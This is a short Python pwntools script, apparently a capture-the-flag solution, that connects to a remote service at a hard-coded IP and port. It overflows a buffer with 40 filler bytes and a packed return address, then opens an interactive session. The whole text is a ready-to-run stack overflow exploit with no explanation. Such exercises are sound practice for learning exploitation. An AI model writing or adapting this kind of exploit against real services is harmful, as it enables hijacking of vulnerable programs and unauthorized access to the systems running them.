from pwn import *

p=remote('139.59.30.165',8700)
p.recvuntil(">>>")
payload=""
payload+="A"*40
payload+=p64(0x00400766)
p.sendline(payload)
p.recv()
p.interactive()